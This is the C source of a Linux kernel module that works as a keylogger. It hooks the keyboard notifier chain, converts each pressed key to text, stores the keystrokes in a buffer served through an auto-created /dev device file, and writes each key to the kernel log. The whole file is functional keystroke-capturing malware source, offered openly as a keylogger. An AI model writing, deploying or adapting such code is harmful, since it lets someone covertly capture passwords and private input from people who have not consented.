#include "file_ops.h"

/* Meta Information */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Itay Nafrin");
MODULE_DESCRIPTION("Registers a device number. Auto create /dev file. Add information from the keys pressed to the file.");


int keycode_to_string(int keycode, int shift_mask, char* buf, unsigned int buf_size)
{
        if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE)
        {
                const char *us_key = (shift_mask == 1)
                        ? us_keymap[keycode][1]
                        : us_keymap[keycode][0]; /* Check if shift pressed. */

                len = snprintf(buf, buf_size, "%s", us_key); /* enter the key pair to buf */
        }
	return len; 
}

int keyboard_event_handler(struct notifier_block* nblock, unsigned long code, void* _param)
{
        char keybuf[12] = {0};
        struct keyboard_notifier_param* param = _param;

        if (!(param->down))
                return NOTIFY_OK;

        if(code == KBD_KEYCODE)
        {
                len = keycode_to_string(param->value, param->shift, keybuf, 12);

                if (strlen(keybuf) > 0)
                {
                        strncpy(msg+buf_index, keybuf, len);
                        buf_index += len;

                        // msg[buf_index] = '\n';
                        //buf_index += 1;
			printk(KERN_INFO "Keylog: %s", keybuf);
                }

        }
        return NOTIFY_OK;
} 

static struct notifier_block keysniffer_blk = {
        .notifier_call = keyboard_event_handler,
};


/*
 * @brief This function is called, when the module is loaded into the kernel
 */
static int __init keylogger_init(void) {
        int retval;
        printk("Hello, Kernel!\n");

        /* Allocate a device nr */
        if( alloc_chrdev_region(&dev_nr, 0, 1, DRIVER_NAME) < 0) {
                printk("Device Nr. could not be allocated!\n");
                return -1;
        }
        printk("kkeylogger - Device Nr. Major: %d, Minor: %d was registered!\n", MAJOR(dev_nr), MINOR(dev_nr));

        /* Create device class */
        if((my_class = class_create(THIS_MODULE, DRIVER_CLASS)) == NULL) {
                printk("Device class can not be created!\n");
                goto ClassError;
        }

        /* create device file */
        if(device_create(my_class, NULL, dev_nr, NULL, DRIVER_NAME) == NULL) {
                printk("Can not create device file!\n");
                goto FileError;
        }

        /* Initialize device file */
        cdev_init(&my_device, &fops);

        /* Regisering device to kernel */
        if(cdev_add(&my_device, dev_nr, 1) == -1) {
                printk("Registering of device to kernel failed!\n");
                goto AddError;
        }

	if((register_keyboard_notifier(&keysniffer_blk) < 0))
	{
		printk(KERN_ALERT "Unable to load key notifier!\n");
		return -1;
	}
	return 0;
	
AddError:
        device_destroy(my_class, dev_nr);
FileError:
        class_destroy(my_class);
ClassError:
        unregister_chrdev_region(dev_nr, 1);
        return -1;

}

/**
 * @brief This function is called, when the module is removed from the kernel
 */
static void __exit keylogger_exit(void) {
	unregister_keyboard_notifier(&keysniffer_blk);
        cdev_del(&my_device);
        device_destroy(my_class, dev_nr);
        class_destroy(my_class);
        unregister_chrdev_region(dev_nr, 1);
        printk("Goodbye, Kernel\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
